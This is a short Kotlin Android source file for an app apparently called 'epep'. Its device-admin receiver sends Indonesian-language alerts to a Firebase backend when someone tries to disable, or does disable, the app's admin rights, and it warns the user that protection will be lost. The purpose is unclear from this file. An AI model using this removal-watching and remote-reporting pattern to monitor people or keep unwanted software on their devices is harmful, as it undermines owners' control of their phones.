package com.sanz.epep.receiver

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import com.sanz.epep.data.local.PrefsManager
import com.sanz.epep.data.remote.FirebaseResponder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class AdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
    }

    override fun onDisableRequested(context: Context, intent: Intent): CharSequence {
        PrefsManager.init(context)
        CoroutineScope(Dispatchers.IO).launch {
            FirebaseResponder.sendResponse("⚠️ PERINGATAN: Seseorang mencoba menonaktifkan proteksi perangkat!")
        }
        return "PERINGATAN: Menonaktifkan admin perangkat akan menghapus semua proteksi keamanan. Lanjutkan?"
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        PrefsManager.init(context)
        CoroutineScope(Dispatchers.IO).launch {
            FirebaseResponder.sendResponse("🚨 ALERT: Proteksi perangkat telah DINONAKTIFKAN! Aplikasi bisa dihapus!")
        }
    }
}
